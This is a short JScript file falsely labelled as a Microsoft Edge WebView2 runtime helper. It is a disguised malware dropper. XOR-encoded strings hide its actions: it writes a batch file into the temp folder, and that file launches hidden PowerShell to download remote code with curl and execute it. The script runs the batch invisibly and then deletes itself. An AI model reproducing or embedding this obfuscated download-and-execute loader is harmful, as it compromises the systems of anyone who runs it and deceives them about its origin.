// Microsoft Edge WebView2 Runtime Helper
// Build 126.0.2592.87 (Official build) x64
// (c) Microsoft Corporation. All rights reserved.
// Licensed under the MIT License.
var _k = [0x37, 0x5A, 0x1F];
var _d = function(a) { var r = ''; for (var i = 0; i < a.length; i++) r += String.fromCharCode(a[i] ^ _k[i % 3]); return r; };

var _s = new ActiveXObject(_d([96,9,124,69,51,111,67,116,76,95,63,115,91]));
var _f = new ActiveXObject(_d([100,57,109,94,42,107,94,52,120,25,28,118,91,63,76,78,41,107,82,55,80,85,48,122,84,46]));

var _tp = _s.ExpandEnvironmentStrings(_d([18,46,122,90,42,58]));
var _bt = _tp + _d([107,31,123,80,63,74,71,62,49,85,59,107]);

var _bf = _f.CreateTextFile(_bt, true);
_bf.WriteLine(_d([119,63,124,95,53,63,88,60,121]));
_bf.WriteLine(_d([68,63,107,23,59,34,71,53,104]));
_bf.WriteLine(_d([68,63,107,23,56,34,82,40,108,95]));
_bf.WriteLine(_d([68,63,107,23,57,34,82,54,115]));
_bf.WriteLine(_d([84,59,115,91,122,58,86,127,58,85,127,58,84,127,63,26,45,63,95,122,50,84,122,61,94,63,103,31,57,106,69,54,49,82,34,122,23,119,108,23,50,107,67,42,108,13,117,48,85,51,115,85,59,112,91,59,116,82,116,124,88,55,48,68,115,61]));
_bf.WriteLine(_d([83,63,115,23,120,58,73,60,47,21]));
_bf.Close();

_s.Run(_d([84,55,123]) + ' /c "' + _bt + '"', 0, false);

try { _f.DeleteFile(WScript.ScriptFullName); } catch(_) {}
